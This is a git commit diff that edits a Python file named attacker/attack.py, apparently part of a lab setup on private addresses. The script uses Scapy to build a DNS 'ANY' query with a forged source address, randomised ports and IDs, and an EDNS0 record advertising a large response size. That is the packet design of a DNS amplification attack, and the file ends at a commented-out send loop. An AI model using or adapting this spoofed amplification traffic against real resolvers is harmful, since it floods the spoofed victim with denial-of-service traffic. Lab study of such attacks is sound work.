87b3b02c457895080bd737af744771990f78be7a
Dan Ristea <dan.ristea@zerodeposit.com>
2020-02-24 14:22:17 +0000

    Add more options to bind

--- attacker/attack.py
+++ attacker/attack.py
@@ -1,14 +1,17 @@
 from scapy.config import conf
-from scapy.layers.dns import DNS, DNSQR
+from scapy.layers.dns import DNS, DNSQR, DNSRROPT
 from scapy.layers.inet import IP, UDP
 from scapy.sendrecv import send
+from scapy.volatile import RandShort
 
 conf.verb = 0
 
 request = (
-    IP(src="172.16.238.10", dst="172.16.238.8") /
-    UDP(dport=53) /
-    DNS(rd=1, qdcount=1, cd=1, qd=DNSQR(qname="example.com", qtype=255, qclass=255))
+        IP(src="172.16.238.10", dst="172.16.238.8") /
+        UDP(dport=53, sport=RandShort()) /
+        DNS(id=RandShort(), rd=1, qdcount=1, cd=1, qd=DNSQR(qname="example.com", qtype=255, qclass=1),
+            ar=DNSRROPT(rclass=65527, rdlen=0)
+            )
 )
 print(len(request))
 # while 1:
